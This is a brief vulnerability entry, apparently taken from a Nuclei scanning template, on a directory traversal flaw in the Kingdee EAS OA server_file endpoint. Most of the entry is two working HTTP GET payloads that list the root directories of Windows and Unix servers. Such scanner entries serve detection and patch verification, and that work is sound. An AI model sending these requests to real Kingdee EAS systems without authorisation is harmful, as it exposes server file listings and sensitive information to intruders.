# Vulnerability: Kingdee EAS - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`kingdee-eas-directory-traversal.yaml`)

## Description
Kingdee EAS OA server_file is vulnerable to local file inclusion and can allow attackers to obtain sensitive server information.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/appmonitor/protected/selector/server_file/files?folder=C://&suffix=
GET {{BaseURL}}/appmonitor/protected/selector/server_file/files?folder=/&suffix=
```

